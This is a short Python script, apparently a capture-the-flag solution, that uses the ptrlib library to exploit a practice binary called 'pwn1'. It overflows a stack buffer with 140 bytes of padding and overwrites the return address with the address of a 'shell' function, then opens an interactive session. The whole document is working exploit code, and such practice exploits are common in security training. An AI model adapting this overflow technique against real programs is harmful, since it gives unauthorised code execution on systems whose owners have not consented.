from ptrlib import *

elf = ELF("./pwn1")
sock = Process("./pwn1")
sock.sendline(b"A" * 140 + p32(elf.symbol("shell")))
sock.interactive()
